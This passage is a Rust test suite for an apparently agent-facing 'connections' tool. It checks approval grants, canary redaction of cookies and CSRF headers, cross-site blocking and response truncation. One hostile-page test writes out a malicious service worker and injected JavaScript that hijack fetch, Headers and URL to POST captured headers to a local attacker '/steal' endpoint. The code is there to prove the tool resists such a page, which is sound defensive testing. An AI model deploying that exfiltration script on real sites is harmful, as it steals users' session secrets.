use super::browser::{model, tool};
use super::*;

const HEADER_CANARY: &str = "HEADER_VALUE_CANARY_CONNECTION_748f";
const COOKIE_CANARY: &str = "COOKIE_VALUE_CANARY_CONNECTION_85ae";

fn record(daemon: &Daemon, site: &str, home: &str, signer: &str) -> Connection {
    daemon
        .shared
        .connections
        .record(crate::connections::Record {
            site,
            keys: &[],
            source: ConnectionSource::Login,
            status: ConnectionStatus::Active,
            identity: None,
            identity_source: ConnectionIdentitySource::None,
            home: Some(home),
            session: None,
            agent: signer,
            vault_item: None,
            account_space: None,
        })
        .unwrap()
}
async fn answer(daemon: &Daemon, id: &TicketId, value: Value) {
    let (_, token) = daemon
        .shared
        .db
        .pair_as(
            "approver".into(),
            vec![CapabilityScope::Approve],
            DeviceKind::PersonDevice,
        )
        .await
        .unwrap();
    let response = api::router(daemon.shared.clone(), false)
        .oneshot(request(
            "POST",
            &format!("/v1/tickets/{id}/resolve"),
            json!({"value":value}),
            Some(&token),
        ))
        .await
        .unwrap();
    assert_eq!(
        response.status(),
        StatusCode::OK,
        "{}",
        json_body(response).await
    );
}
async fn config(root: &Path) -> Resolved {
    let mut config = super::browser::browser_config(root).expect("headless Chromium required");
    config.loaded.config.policy.mode = openside_config::PolicyModeSetting::Full;
    config.loaded.config.tickets.confirm_ttl_secs = 300;
    config
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn connection_tools_grant_matrix_once_always_and_requesting_origin() {
    let root = tempfile::tempdir().unwrap();
    let cfg = config(root.path()).await;
    let daemon = Daemon::open_runtime(cfg.clone(), TestRuntime::default())
        .await
        .unwrap();
    let draft: HireDraft = serde_json::from_value(json!({"name":"Mina","persona":{"role":"Checks sites","responsibilities":["Check signed-in sites"]}})).unwrap();
    let teammate = crate::agents::create(&daemon.shared, &draft, "mina")
        .await
        .unwrap_or_else(|error| panic!("{}", error.1));
    let row = record(&daemon, "example.com", "https://app.example.com/", "chief");
    let signer_row = record(&daemon, "example.net", "https://example.net/", "mina");
    let chief = daemon.shared.agents.get("chief").unwrap().unwrap();
    let chief_env = crate::tools::ToolEnv::new(
        daemon.shared.clone(),
        &daemon
            .shared
            .db
            .state(&chief.home_session_id)
            .await
            .unwrap(),
    );
    let teammate_env = crate::tools::ToolEnv::new(
        daemon.shared.clone(),
        &daemon
            .shared
            .db
            .state(&teammate.home_session_id)
            .await
            .unwrap(),
    );
    let args = json!({"connection_id":row.id});
    assert!(matches!(
        crate::tools::connections::admit_grant(&chief_env, "connection_open", &args, None)
            .await
            .unwrap_or_else(|error| panic!("{}", error.0)),
        crate::tools::connections::GrantAdmission::Allowed
    ));
    assert!(matches!(
        crate::tools::connections::admit_grant(
            &teammate_env,
            "connection_open",
            &json!({"connection_id":signer_row.id}),
            None
        )
        .await
        .unwrap_or_else(|error| panic!("{}", error.0)),
        crate::tools::connections::GrantAdmission::Allowed
    ));
    assert!(matches!(
        crate::tools::connections::admit_grant(&teammate_env, "connection_check", &args, None)
            .await
            .unwrap_or_else(|error| panic!("{}", error.0)),
        crate::tools::connections::GrantAdmission::Allowed
    ));
    let invocation = call("connection_open", args.clone(), "grant-once");
    let outcome = host(&daemon, &teammate.home_session_id)
        .await
        .call(invocation)
        .await;
    let ToolOutcome::Deferred { ticket, .. } = outcome else {
        panic!("teammate did not ask: {outcome:?}")
    };
    let stored = daemon
        .shared
        .db
        .state(&teammate.home_session_id)
        .await
        .unwrap()
        .tickets[&ticket]
        .clone();
    assert_eq!(stored.kind, TicketKind::Confirm);
    assert!(
        stored.summary.contains("Mina")
            && stored.summary.contains("example.com")
            && stored.summary.contains("no open page")
    );
    assert_eq!(
        stored
            .options
            .iter()
            .map(|option| option.value.as_str())
            .collect::<Vec<_>>(),
        ["once", "always", "reject"]
    );
    let (_, agent_client) = daemon
        .shared
        .db
        .pair_as(
            "agent-client".into(),
            vec![CapabilityScope::Approve],
            DeviceKind::AgentClient,
        )
        .await
        .unwrap();
    for choice in ["once", "always"] {
        let denied = api::router(daemon.shared.clone(), false)
            .oneshot(request(
                "POST",
                &format!("/v1/tickets/{ticket}/resolve"),
                json!({"value":choice}),
                Some(&agent_client),
            ))
            .await
            .unwrap();
        assert_eq!(denied.status(), StatusCode::FORBIDDEN);
    }
    answer(&daemon, &ticket, json!("once")).await;
    let binding_tool = stored.tool.unwrap();
    let mut bound = json!({"tool":binding_tool.name,"args":binding_tool.args});
    bound.sort_all_objects();
    use sha2::{Digest, Sha256};
    let digest: [u8; 32] = Sha256::digest(bound.to_string().as_bytes()).into();
    let session = teammate.home_session_id.clone();
    let (s, t) = (session.clone(), ticket.clone());
    assert!(daemon
        .shared
        .db
        .store(move |store| Ok(store.connection_grant_available(&s, &t, None, &digest)?))
        .await
        .unwrap());
    daemon.shutdown().await;
    drop(chief_env);
    drop(teammate_env);
    drop(daemon);
    let daemon = Daemon::open_runtime(cfg, TestRuntime::default())
        .await
        .unwrap();
    let (s, t) = (session.clone(), ticket.clone());
    assert!(daemon
        .shared
        .db
        .store(move |store| Ok(store.claim_connection_grant(&s, &t, None, &digest)?))
        .await
        .unwrap());
    let (s, t) = (session.clone(), ticket.clone());
    assert!(!daemon
        .shared
        .db
        .store(move |store| Ok(store.claim_connection_grant(&s, &t, None, &digest)?))
        .await
        .unwrap());
    let ToolOutcome::Deferred { ticket: always, .. } = host(&daemon, &session)
        .await
        .call(call("connection_open", args, "grant-always"))
        .await
    else {
        panic!("consumed once grant was reused")
    };
    answer(&daemon, &always, json!("always")).await;
    assert!(daemon
        .shared
        .connections
        .get(&row.id)
        .unwrap()
        .unwrap()
        .grants
        .iter()
        .any(|grant| grant.agent_id == "mina" && grant.access == ConnectionAccess::Allowed));
    let denied = record(
        &daemon,
        "denied.example",
        "https://denied.example/",
        "chief",
    );
    daemon
        .shared
        .connections
        .update(
            &denied.id,
            UpdateConnectionRequest {
                grants: Some(vec![ConnectionGrant {
                    agent_id: "mina".into(),
                    access: ConnectionAccess::Denied,
                }]),
                home_url: None,
            },
        )
        .unwrap();
    let listed = model(
        tool(
            &daemon,
            &session,
            "connections_list",
            json!({}),
            "list-before-retire",
        )
        .await,
    );
    assert!(!listed
        .as_array()
        .unwrap()
        .iter()
        .any(|value| value["id"] == denied.id));
    let mut retired = daemon.shared.agents.get("mina").unwrap().unwrap();
    retired.status = AgentStatus::Retired;
    daemon.shared.agents.put(&retired, "retired").unwrap();
    assert!(matches!(
        tool(
            &daemon,
            &session,
            "connections_list",
            json!({}),
            "retired-list"
        )
        .await,
        ToolOutcome::Denied { .. }
    ));
    daemon.shutdown().await;
    drop(daemon);
    let reopened = crate::connections::Service::open(&root.path().join("data")).unwrap();
    assert!(reopened
        .get(&row.id)
        .unwrap()
        .unwrap()
        .grants
        .iter()
        .any(|grant| grant.agent_id == "mina" && grant.access == ConnectionAccess::Allowed));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn connection_tools_headless_fetch_approval_canaries_cross_site_and_body_cap() {
    use axum::{
        extract::State,
        http::{header, HeaderMap},
        response::{Html, IntoResponse},
        routing::{get, post},
        Json, Router,
    };
    use std::sync::atomic::{AtomicUsize, Ordering};
    let root = tempfile::tempdir().unwrap();
    let daemon = Daemon::open_runtime(config(root.path()).await, TestRuntime::default())
        .await
        .unwrap();
    let writes = Arc::new(AtomicUsize::new(0));
    let app=Router::new()
        .route("/",get(||async {([(header::SET_COOKIE,format!("session={COOKIE_CANARY}; HttpOnly; Path=/"))],Html("<h1>Signed in</h1><a href='/logout'>Sign out</a>"))}))
        .route("/seed",get(||async {"seed"}))
        .route("/echo",get(|headers:HeaderMap|async move {
            let csrf=headers.get("x-csrf").and_then(|value|value.to_str().ok()).unwrap_or_default().to_owned();
            ([("x-echoed-csrf",csrf)],Json(json!({"cookie":headers.get("cookie").and_then(|value|value.to_str().ok()),"csrf":headers.get("x-csrf").and_then(|value|value.to_str().ok())})))
        }))
        .route("/large",get(||async {"x".repeat(100_000)}))
        .route("/write",post(|State(writes):State<Arc<AtomicUsize>>|async move {writes.fetch_add(1,Ordering::SeqCst);"written"}))
        .route("/redirect",get(||async {axum::response::Redirect::temporary("https://example.invalid/elsewhere").into_response()}))
        .route("/unauthorized",get(||async {StatusCode::UNAUTHORIZED}))
        .with_state(writes.clone());
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let origin = format!("http://localhost:{}", listener.local_addr().unwrap().port());
    let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    let session = create_session(&daemon, "connection tools", PolicyMode::Full, None).await;
    let row = record(&daemon, "localhost", &format!("{origin}/"), "chief");
    let opened = model(
        tool(
            &daemon,
            &session,
            "connection_open",
            json!({"connection_id":row.id}),
            "conn-open",
        )
        .await,
    );
    let tab = opened["tab_id"].as_str().unwrap();
    let browser = daemon
        .shared
        .registry
        .browser
        .for_tab(&daemon.shared, &session, tab)
        .await
        .map_err(|error| error.0)
        .unwrap();
    browser.record_protocol(true);
    browser
        .evaluate(
            tab,
            &format!("fetch('/seed',{{headers:{{'x-csrf':'{HEADER_CANARY}'}}}}).then(()=>null)"),
        )
        .await
        .unwrap();
    let observed = tokio::time::timeout(Duration::from_secs(5), async {
        loop {
            let observed = model(
                tool(
                    &daemon,
                    &session,
                    "connection_observe",
                    json!({"tab_id":tab}),
                    "conn-observe",
                )
                .await,
            );
            if let Some(request) = observed
                .as_array()
                .unwrap()
                .iter()
                .find(|request| request["path"] == "/seed")
            {
                break request.clone();
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    })
    .await
    .unwrap();
    assert!(observed["header_names"]
        .as_array()
        .unwrap()
        .iter()
        .any(|value| value
            .as_str()
            .is_some_and(|name| name.eq_ignore_ascii_case("x-csrf"))));
    assert!(!observed.to_string().contains(HEADER_CANARY));
    // The trusted fixture inserted the canary directly, so begin protocol leakage checks after it.
    let _ = browser.take_protocol_log();
    let fetched=model(tool(&daemon,&session,"connection_fetch",json!({"connection_id":row.id,"tab_id":tab,"method":"GET","path":"/echo","reuse_headers_from":observed["request_id"]}),"conn-echo").await);
    assert_eq!(fetched["status"], 200);
    assert!(fetched["body"].as_str().unwrap().contains("[REDACTED]"));
    let echoed: Value = serde_json::from_str(fetched["body"].as_str().unwrap()).unwrap();
    assert_eq!(echoed["csrf"], "[REDACTED]");
    assert_eq!(echoed["cookie"], "session=[REDACTED]");
    for secret in [COOKIE_CANARY, HEADER_CANARY] {
        assert!(!fetched.to_string().contains(secret));
    }
    assert!(daemon.shared.registry.browser.tab_tainted(tab).await);
    assert!(matches!(
        tool(
            &daemon,
            &session,
            "browser_screenshot",
            json!({"tab_id":tab}),
            "conn-tainted-shot"
        )
        .await,
        ToolOutcome::Denied { .. }
    ));
    for path in [
        format!("{}/echo", origin.replace("localhost", "127.0.0.1")),
        "https://example.invalid/echo".into(),
    ] {
        assert!(
            matches!(tool(&daemon,&session,"connection_fetch",json!({"connection_id":row.id,"tab_id":tab,"method":"GET","path":path}),"conn-cross-site").await,ToolOutcome::Denied{reason,..} if reason == "connection_cross_site")
        );
    }
    let foreign = record(&daemon, "example.com", "https://example.com/", "chief");
    assert!(
        matches!(tool(&daemon,&session,"connection_fetch",json!({"connection_id":foreign.id,"tab_id":tab,"method":"GET","path":"/echo"}),"conn-foreign-row").await,ToolOutcome::Denied{reason,..} if reason == "connection_cross_site")
    );
    let mut write = call(
        "connection_fetch",
        json!({"connection_id":row.id,"tab_id":tab,"method":"POST","path":"/write","query":{"token":"QUERY_CANARY"},"json_body":{"secret":"BODY_CANARY"}}),
        "conn-write",
    );
    let ToolOutcome::Deferred { ticket, .. } =
        host(&daemon, &session).await.call(write.clone()).await
    else {
        panic!("POST ran without Confirm")
    };
    assert_eq!(writes.load(Ordering::SeqCst), 0);
    let ticket_value = daemon.shared.db.state(&session).await.unwrap().tickets[&ticket].clone();
    assert_eq!(ticket_value.kind, TicketKind::Confirm);
    assert!(ticket_value.summary.contains("POST /write"));
    let ticket_json = serde_json::to_string(&ticket_value).unwrap();
    assert!(!ticket_json.contains("QUERY_CANARY") && !ticket_json.contains("BODY_CANARY"));
    answer(&daemon, &ticket, json!(true)).await;
    write.approval_ticket = Some(ticket.clone());
    let mut changed = write.clone();
    changed.arguments_json =
        json!({"connection_id":row.id,"tab_id":tab,"method":"POST","path":"/echo"}).to_string();
    assert!(
        matches!(host(&daemon,&session).await.call(changed).await,ToolOutcome::Denied{reason,..}if reason == "approval_args_mismatch")
    );
    assert_eq!(
        model(host(&daemon, &session).await.call(write.clone()).await)["status"],
        200
    );
    assert_eq!(writes.load(Ordering::SeqCst), 1);
    assert!(
        matches!(host(&daemon,&session).await.call(write).await,ToolOutcome::Denied{reason,..}if reason == "approval_already_used")
    );
    let large = model(
        tool(
            &daemon,
            &session,
            "connection_fetch",
            json!({"connection_id":row.id,"tab_id":tab,"method":"GET","path":"/large"}),
            "conn-large",
        )
        .await,
    );
    assert_eq!(large["body"].as_str().unwrap().len(), 64 * 1024);
    assert_eq!(large["truncated"], true);
    let redirect = model(
        tool(
            &daemon,
            &session,
            "connection_fetch",
            json!({"connection_id":row.id,"tab_id":tab,"method":"GET","path":"/redirect"}),
            "conn-redirect",
        )
        .await,
    );
    assert_eq!(redirect["error"], "connection_cross_site");
    let unauthorized = model(
        tool(
            &daemon,
            &session,
            "connection_fetch",
            json!({"connection_id":row.id,"tab_id":tab,"method":"GET","path":"/unauthorized"}),
            "conn-401",
        )
        .await,
    );
    assert_eq!(unauthorized["status"], 401);
    assert_eq!(
        daemon
            .shared
            .connections
            .get(&row.id)
            .unwrap()
            .unwrap()
            .status,
        ConnectionStatus::NeedsLogin
    );
    let events =
        serde_json::to_string(&daemon.shared.db.events(&session, 0).await.unwrap()).unwrap();
    let audit = std::fs::read_to_string(
        daemon
            .shared
            .config
            .data_dir
            .join("connections-audit.jsonl"),
    )
    .unwrap();
    assert!(audit.contains("POST /write"));
    assert!(!audit.contains("QUERY_CANARY") && !audit.contains("BODY_CANARY"));
    let protocol = serde_json::to_string(&browser.take_protocol_log()).unwrap();
    let network = format!(
        "{:?}",
        browser
            .network_events(session.as_str(), tab, 0)
            .await
            .unwrap()
    );
    for secret in [COOKIE_CANARY, HEADER_CANARY] {
        for output in [&events, &audit, &protocol, &network] {
            assert!(!output.contains(secret));
        }
    }
    let draft:HireDraft=serde_json::from_value(json!({"name":"Tara","persona":{"role":"Checks connections","responsibilities":["Check sites"]}})).unwrap();
    let teammate = crate::agents::create(&daemon.shared, &draft, "tara")
        .await
        .unwrap_or_else(|error| panic!("{}", error.1));
    let requesting_origin = origin.replace("localhost", "127.0.0.1");
    let _ = super::browser::open_tab(
        &daemon,
        &teammate.home_session_id,
        &format!("{requesting_origin}/"),
        "requester-origin",
    )
    .await;
    let ToolOutcome::Deferred { ticket: grant, .. } = tool(
        &daemon,
        &teammate.home_session_id,
        "connection_open",
        json!({"connection_id":row.id}),
        "origin-grant",
    )
    .await
    else {
        panic!("teammate did not ask")
    };
    let grant_value = daemon
        .shared
        .db
        .state(&teammate.home_session_id)
        .await
        .unwrap()
        .tickets[&grant]
        .clone();
    assert!(grant_value
        .summary
        .contains(&format!("while on {requesting_origin}")));
    assert_eq!(
        grant_value.target.as_ref().unwrap().origin.as_deref(),
        Some(requesting_origin.as_str())
    );
    answer(&daemon, &grant, json!("once")).await;
    let granted = model(
        tool(
            &daemon,
            &teammate.home_session_id,
            "connection_open",
            json!({"connection_id":row.id}),
            "origin-once-open",
        )
        .await,
    );
    assert!(granted["tab_id"].is_string());
    assert!(matches!(
        tool(
            &daemon,
            &teammate.home_session_id,
            "connection_open",
            json!({"connection_id":row.id}),
            "origin-repeat"
        )
        .await,
        ToolOutcome::Deferred { .. }
    ));
    daemon.shutdown().await;
    server.abort();
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn connection_tools_cookie_prefix_keeps_typed_ids_and_grant_bindings_usable() {
    use axum::{
        extract::State,
        http::{header, HeaderMap},
        response::{Html, IntoResponse},
        routing::get,
        Json, Router,
    };
    let root = tempfile::tempdir().unwrap();
    let daemon = Daemon::open_runtime(config(root.path()).await, TestRuntime::default())
        .await
        .unwrap();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let origin = format!("http://localhost:{}", listener.local_addr().unwrap().port());
    let row = record(&daemon, "localhost", &format!("{origin}/"), "chief");
    let cookie = Arc::new(row.id[..16].to_owned());
    let app = Router::new()
        .route(
            "/",
            get(|State(cookie): State<Arc<String>>| async move {
                let mut response = (
                    [(
                        header::SET_COOKIE,
                        format!("session={cookie}; HttpOnly; Path=/"),
                    )],
                    Html("<h1>Account</h1><a href='/logout'>Sign out</a>"),
                )
                    .into_response();
                response.headers_mut().append(
                    header::SET_COOKIE,
                    axum::http::HeaderValue::from_static("preference=once; HttpOnly; Path=/"),
                );
                response
            }),
        )
        .route(
            "/echo",
            get(|headers: HeaderMap| async move {
                Json(json!({"cookie":headers.get("cookie").and_then(|value|value.to_str().ok())}))
            }),
        )
        .with_state(cookie.clone());
    let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    let session = create_session(&daemon, "prefix-safe metadata", PolicyMode::Full, None).await;
    let opened = model(
        tool(
            &daemon,
            &session,
            "connection_open",
            json!({"connection_id":row.id}),
            "prefix-open",
        )
        .await,
    );
    let tab = opened["tab_id"].as_str().unwrap();
    let browser = daemon
        .shared
        .registry
        .browser
        .for_tab(&daemon.shared, &session, tab)
        .await
        .map_err(|error| error.0)
        .unwrap();
    browser.record_protocol(true);
    let fetched = model(
        tool(
            &daemon,
            &session,
            "connection_fetch",
            json!({"connection_id":row.id,"tab_id":tab,"method":"GET","path":"/echo"}),
            "prefix-fetch",
        )
        .await,
    );
    assert!(!fetched.to_string().contains(cookie.as_str()));
    assert!(fetched["body"].as_str().unwrap().contains("[REDACTED]"));
    let listed = model(
        tool(
            &daemon,
            &session,
            "connections_list",
            json!({}),
            "prefix-list",
        )
        .await,
    );
    assert_eq!(listed[0]["id"], row.id);
    let checked = model(
        tool(
            &daemon,
            &session,
            "connection_check",
            json!({"connection_id":row.id}),
            "prefix-check",
        )
        .await,
    );
    assert_eq!(checked["id"], row.id);
    let draft:HireDraft=serde_json::from_value(json!({"name":"Pia","persona":{"role":"Checks accounts","responsibilities":["Check signed-in sites"]}})).unwrap();
    let teammate = crate::agents::create(&daemon.shared, &draft, "pia")
        .await
        .unwrap_or_else(|error| panic!("{}", error.1));
    let ToolOutcome::Deferred { ticket, .. } = tool(
        &daemon,
        &teammate.home_session_id,
        "connection_open",
        json!({"connection_id":row.id}),
        "prefix-grant",
    )
    .await
    else {
        panic!("missing grant ticket")
    };
    let grant = daemon
        .shared
        .db
        .state(&teammate.home_session_id)
        .await
        .unwrap()
        .tickets[&ticket]
        .clone();
    assert_eq!(grant.tool.as_ref().unwrap().args["connection_id"], row.id);
    assert_eq!(
        grant
            .options
            .iter()
            .map(|option| option.value.as_str())
            .collect::<Vec<_>>(),
        ["once", "always", "reject"]
    );
    answer(&daemon, &ticket, json!("once")).await;
    assert_eq!(
        daemon
            .shared
            .db
            .state(&teammate.home_session_id)
            .await
            .unwrap()
            .tickets[&ticket]
            .resolution
            .as_ref()
            .unwrap()["access"],
        "once"
    );
    assert!(model(
        tool(
            &daemon,
            &teammate.home_session_id,
            "connection_open",
            json!({"connection_id":row.id}),
            "prefix-once"
        )
        .await
    )["tab_id"]
        .is_string());
    let log = serde_json::to_string(&browser.take_protocol_log()).unwrap();
    assert!(!log.contains(cookie.as_str()));
    let mut events =
        serde_json::to_value(daemon.shared.db.events(&session, 0).await.unwrap()).unwrap();
    fn remove_identifiers(value: &mut Value) {
        match value {
            Value::Object(object) => {
                for (key, value) in object {
                    if matches!(key.as_str(), "connection_id" | "id") {
                        *value = Value::Null;
                    } else {
                        remove_identifiers(value);
                    }
                }
            }
            Value::Array(values) => values.iter_mut().for_each(remove_identifiers),
            _ => {}
        }
    }
    remove_identifiers(&mut events);
    assert!(!events.to_string().contains(cookie.as_str()));
    let audit = std::fs::read_to_string(
        daemon
            .shared
            .config
            .data_dir
            .join("connections-audit.jsonl"),
    )
    .unwrap();
    for line in audit.lines() {
        let mut record: Value = serde_json::from_str(line).unwrap();
        remove_identifiers(&mut record);
        assert!(!record.to_string().contains(cookie.as_str()));
    }
    daemon.shutdown().await;
    server.abort();
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn connection_tools_isolated_fetch_fences_hostile_page_and_worker_and_path_cookies() {
    use axum::{
        extract::State,
        http::{header, HeaderMap},
        response::Html,
        routing::{any, get},
        Json, Router,
    };
    use std::sync::atomic::{AtomicUsize, Ordering};
    const PATH_COOKIE: &str = "PATH_API_COOKIE_CANARY_27df";
    struct Fixture {
        attacker: String,
        native_requests: AtomicUsize,
        slow_started: tokio::sync::Notify,
        slow_release: tokio::sync::Notify,
    }
    let hits = Arc::new(AtomicUsize::new(0));
    let attacker_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let attacker = format!(
        "http://127.0.0.1:{}",
        attacker_listener.local_addr().unwrap().port()
    );
    let attacker_app = Router::new()
        .route(
            "/steal",
            any(|State(hits): State<Arc<AtomicUsize>>| async move {
                hits.fetch_add(1, Ordering::SeqCst);
                "received"
            }),
        )
        .with_state(hits.clone());
    let attacker_server =
        tokio::spawn(async move { axum::serve(attacker_listener, attacker_app).await.unwrap() });
    let fixture = Arc::new(Fixture {
        attacker: attacker.clone(),
        native_requests: AtomicUsize::new(0),
        slow_started: tokio::sync::Notify::new(),
        slow_release: tokio::sync::Notify::new(),
    });
    let app=Router::new()
        .route("/",get(||async {
            ([(header::SET_COOKIE,format!("api_session={PATH_COOKIE}; HttpOnly; Path=/api"))],
                Html("<h1>Account</h1><a href='/logout'>Sign out</a>"))
        }))
        .route("/seed",get(||async{"seed"}))
        .route("/api/echo",get(|State(fixture):State<Arc<Fixture>>,headers:HeaderMap|async move {
            fixture.native_requests.fetch_add(1,Ordering::SeqCst);
            Json(json!({"proof":"native-server","cookie":headers.get("cookie").and_then(|v|v.to_str().ok()),
                "csrf":headers.get("x-csrf").and_then(|v|v.to_str().ok())}))
        }))
        .route("/api/slow",get(|State(fixture):State<Arc<Fixture>>|async move {
            fixture.slow_started.notify_one();
            fixture.slow_release.notified().await;
            "native-slow-response"
        }))
        .route("/worker.js",get(|State(fixture):State<Arc<Fixture>>|async move {
            let script=format!(r#"
                self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));
                self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));
                self.addEventListener('fetch',e=>{{
                    const path=new URL(e.request.url).pathname;
                    if(path==='/api/echo') e.respondWith(fetch({attacker}+'/steal',
                        {{method:'POST',mode:'no-cors',body:e.request.headers.get('x-csrf') || 'worker'}})
                        .then(()=>new Response('worker-fabricated')));
                    if(path==='/control') e.respondWith(Promise.resolve(new Response('worker-control')));
                }});
            "#,attacker=json!(fixture.attacker));
            ([(header::CONTENT_TYPE,"application/javascript")],script)
        }))
        .with_state(fixture.clone());
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let origin = format!("http://localhost:{}", listener.local_addr().unwrap().port());
    let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    let root = tempfile::tempdir().unwrap();
    let daemon = Daemon::open_runtime(config(root.path()).await, TestRuntime::default())
        .await
        .unwrap();
    let session = create_session(&daemon, "hostile page fixture", PolicyMode::Full, None).await;
    let row = record(&daemon, "localhost", &format!("{origin}/"), "chief");
    let opened = model(
        tool(
            &daemon,
            &session,
            "connection_open",
            json!({"connection_id":row.id}),
            "hostile-open",
        )
        .await,
    );
    let tab = opened["tab_id"].as_str().unwrap();
    let browser = daemon
        .shared
        .registry
        .browser
        .for_tab(&daemon.shared, &session, tab)
        .await
        .map_err(|e| e.0)
        .unwrap();
    browser
        .evaluate(
            tab,
            &format!(
                "fetch('/seed',{{headers:{{'x-csrf':{}}}}}).then(()=>null)",
                json!(HEADER_CANARY)
            ),
        )
        .await
        .unwrap();
    let observed = tokio::time::timeout(Duration::from_secs(5), async {
        loop {
            let observed = model(
                tool(
                    &daemon,
                    &session,
                    "connection_observe",
                    json!({"tab_id":tab}),
                    "hostile-observe",
                )
                .await,
            );
            if let Some(request) = observed
                .as_array()
                .unwrap()
                .iter()
                .find(|r| r["path"] == "/seed")
            {
                break request.clone();
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    })
    .await
    .unwrap();
    browser.evaluate(tab,r#"(async()=>{
        await navigator.serviceWorker.register('/worker.js');
        await navigator.serviceWorker.ready;
        if(!navigator.serviceWorker.controller) await new Promise(resolve=>navigator.serviceWorker.addEventListener('controllerchange',resolve,{once:true}));
        window.rawFetch=window.fetch.bind(window);
        window.poisoned=0;
        return !!navigator.serviceWorker.controller;
    })()"#).await.map(|value|assert_eq!(value,true)).unwrap();
    let patch = format!(
        "const attacker={}; {}",
        json!(attacker),
        r#"
        const RawHeaders=window.Headers, RawURL=window.URL;
        window.Headers=function(init){window.poisoned++; window.rawFetch(attacker+'/steal',{method:'POST',mode:'no-cors',body:JSON.stringify(init)}).catch(()=>{});return new RawHeaders(init);};
        window.URL=function(...args){window.poisoned++;const u=new RawURL(...args);Object.defineProperty(u,'href',{get:()=>attacker+'/steal'});return u;};
        window.fetch=async(url,opts)=>{window.poisoned++;await window.rawFetch(attacker+'/steal',{method:'POST',mode:'no-cors',body:JSON.stringify(opts?.headers)});return new Response('page-fabricated');};
        null;
    "#
    );
    browser.evaluate(tab, &patch).await.unwrap();
    browser.record_protocol(true);
    let fetched = model(
        tool(
            &daemon,
            &session,
            "connection_fetch",
            json!({"connection_id":row.id,"tab_id":tab,
        "method":"GET","path":"/api/echo","reuse_headers_from":observed["request_id"]}),
            "hostile-fetch",
        )
        .await,
    );
    assert_eq!(fetched["status"], 200);
    let body: Value = serde_json::from_str(fetched["body"].as_str().unwrap()).unwrap();
    assert_eq!(body["proof"], "native-server");
    assert_eq!(body["csrf"], "[REDACTED]");
    assert_eq!(body["cookie"], "api_session=[REDACTED]");
    assert_eq!(fixture.native_requests.load(Ordering::SeqCst), 1);
    assert_eq!(browser.evaluate(tab, "window.poisoned").await.unwrap(), 0);
    assert_eq!(hits.load(Ordering::SeqCst), 0);
    let (slow,blocked)=tokio::time::timeout(Duration::from_secs(10),async {
        tokio::join!(
            tool(&daemon,&session,"connection_fetch",json!({"connection_id":row.id,"tab_id":tab,"method":"GET","path":"/api/slow"}),"fence-slow"),
            async {
                fixture.slow_started.notified().await;
                let blocked=browser.evaluate(tab,&format!("window.rawFetch({}+'/steal',{{method:'POST',mode:'no-cors',body:'public-probe'}}).then(()=>false,()=>true)",json!(attacker))).await.unwrap();
                fixture.slow_release.notify_one();
                blocked
            }
        )
    }).await.unwrap();
    assert_eq!(blocked, true);
    assert_eq!(model(slow)["body"], "native-slow-response");
    assert_eq!(hits.load(Ordering::SeqCst), 0);
    let failed = browser
        .connection_fetch(
            session.as_str(),
            tab,
            &origin,
            json!({"method":"GET","path":"/api/echo","json_body":{"invalid":true}}),
            None,
            |_, _| {},
        )
        .await
        .unwrap();
    assert_eq!(failed["error"], "connection_fetch_failed");
    assert_eq!(
        browser
            .evaluate(tab, "window.rawFetch('/control').then(r=>r.text())")
            .await
            .unwrap(),
        "worker-control"
    );
    assert_eq!(hits.load(Ordering::SeqCst), 0);
    let events =
        serde_json::to_string(&daemon.shared.db.events(&session, 0).await.unwrap()).unwrap();
    let audit = std::fs::read_to_string(
        daemon
            .shared
            .config
            .data_dir
            .join("connections-audit.jsonl"),
    )
    .unwrap();
    let protocol = serde_json::to_string(&browser.take_protocol_log()).unwrap();
    for secret in [HEADER_CANARY, PATH_COOKIE] {
        for output in [&events, &audit, &protocol] {
            assert!(!output.contains(secret));
        }
    }
    daemon.shutdown().await;
    server.abort();
    attacker_server.abort();
}

async fn document_ticket(
    events: &mut tokio::sync::broadcast::Receiver<Event>,
    session: &SessionId,
) -> Ticket {
    tokio::time::timeout(Duration::from_secs(5), async {
        loop {
            let event = events.recv().await.unwrap();
            if event.session_id == *session {
                if let EventKind::TicketOpened { ticket } = event.kind {
                    if ticket
                        .tool
                        .as_ref()
                        .is_some_and(|tool| tool.args["navigation_tab_id"].is_string())
                    {
                        return *ticket;
                    }
                }
            }
        }
    })
    .await
    .expect("document grant ticket")
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn connection_tools_document_grants_cover_navigation_repl_frames_and_forget() {
    use axum::{
        http::{header, HeaderMap},
        response::Html,
        routing::get,
        Router,
    };
    use std::sync::atomic::{AtomicUsize, Ordering};
    let root = tempfile::tempdir().unwrap();
    let cfg = config(root.path()).await;
    let daemon = Daemon::open_runtime(cfg, TestRuntime::default())
        .await
        .unwrap();
    let draft:HireDraft=serde_json::from_value(json!({"name":"Mina","persona":{"role":"Checks sites","responsibilities":["Browse sites"]}})).unwrap();
    let mina = crate::agents::create(&daemon.shared, &draft, "mina")
        .await
        .unwrap_or_else(|error| panic!("{}", error.1));
    let session = &mina.home_session_id;
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let origin = format!("http://localhost:{}", listener.local_addr().unwrap().port());
    let outside = origin.replace("localhost", "127.0.0.1");
    let bank = format!("{origin}/bank");
    let hits = Arc::new(AtomicUsize::new(0));
    let authenticated = Arc::new(AtomicUsize::new(0));
    let (counter, cookies) = (hits.clone(), authenticated.clone());
    let link = format!("<h1>Outside</h1><a href='{bank}'>Bank</a>");
    let frame = format!("<h1>Outside frame</h1><iframe src='{bank}'></iframe>");
    let app = Router::new()
        .route(
            "/bank",
            get(move |headers: HeaderMap| {
                let (counter, cookies) = (counter.clone(), cookies.clone());
                async move {
